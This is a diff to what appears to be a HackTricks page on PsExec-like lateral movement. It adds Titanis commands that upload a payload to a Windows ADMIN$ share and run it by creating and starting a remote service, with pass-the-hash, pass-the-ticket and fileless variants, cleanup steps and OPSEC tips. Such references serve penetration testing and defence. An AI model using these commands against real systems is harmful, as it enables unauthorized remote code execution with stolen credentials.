@@ -120,6 +120,50 @@ cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
 cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
 ```
 
+### Titanis SMB2 staging + SCMR (Service Control Manager RPC)
+
+Titanis provides cross-platform SMB2/MSRPC clients with first-class NTLM and Kerberos support (tickets, ccache, keytabs). Typical PsExec-like flow:
+
+```bash
+# 1) Stage payload over signed/encrypted SMB2
+Smb2Client put \\TARGET\ADMIN$\Temp\payload.exe ./payload.exe -u User -ud DOMAIN -p 'Passw0rd!' -signreq -EncryptSmb
+
+# 2) Create and start a service to execute the payload
+Scm create TARGET -u User -ud DOMAIN -p 'Passw0rd!' -EncryptRpc -PreferSmb HTSvc -DisplayName "HTSvc" C:\\Windows\\Temp\\payload.exe -Start
+
+# Clean up
+Scm stop TARGET -u User -ud DOMAIN -p 'Passw0rd!' -EncryptRpc HTSvc
+Scm delete TARGET -u User -ud DOMAIN -p 'Passw0rd!' -EncryptRpc HTSvc
+```
+
+Pass-the-Hash
+
+```bash
+# Upload and execute using only the NTLM hash
+Smb2Client put \\TARGET\ADMIN$\Temp\payload.exe ./payload.exe -u User -ud DOMAIN -NtlmHash 8846F7EAEE8FB117AD06BDD830B7586C -signreq
+Scm create TARGET -u User -ud DOMAIN -NtlmHash 8846F7EAEE8FB117AD06BDD830B7586C -EncryptRpc HTSvc C:\\Windows\\Temp\\payload.exe -Start
+```
+
+Kerberos Pass-the-Ticket
+
+```bash
+# Use a TGT (.kirbi or ccache). The tool will request CIFS/Host tickets as needed
+Smb2Client put \\TARGET\ADMIN$\Temp\payload.exe ./payload.exe -Tgt user.tgt.kirbi -Kdc dc.domain.local -signreq -EncryptSmb
+Scm create TARGET -Tgt user.tgt.kirbi -Kdc dc.domain.local -EncryptRpc HTSvc C:\\Windows\\Temp\\payload.exe -Start
+```
+
+Fileless service creation
+
+```bash
+# Run a one-liner without dropping a binary
+Scm create TARGET -u User -ud DOMAIN -p 'Passw0rd!' -EncryptRpc HTSvc "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" -Start
+```
+
+Notes
+- Use -signreq to require SMB signing and -EncryptSmb for full SMB encryption.
+- Use -EncryptRpc to enable MS-SCMR packet privacy and -PreferSmb to bind over \\PIPE\\svcctl.
+- Titanis also exposes SRVS RPC to enumerate shares, sessions and open files for OPSEC before/after execution.
+
 ## OPSEC, detection and artifacts
 
 Typical host/network artifacts when using PsExec-like techniques:
@@ -167,5 +211,8 @@ Hunting ideas
 
 - PsExec - Sysinternals | Microsoft Learn: https://learn.microsoft.com/sysinternals/downloads/psexec
 - SMB security hardening in Windows Server 2025 & Windows 11 (signing by default, NTLM blocking): https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591
+- Titanis repository: https://github.com/trustedsec/Titanis
+- Titanis Smb2Client tool docs: https://github.com/trustedsec/Titanis/blob/public/doc/UserGuide/tools/Smb2Client.md
+- Titanis Scm tool docs: https://github.com/trustedsec/Titanis/blob/public/doc/UserGuide/tools/Scm.md
 
 {{#include ../../banners/hacktricks-training.md}}
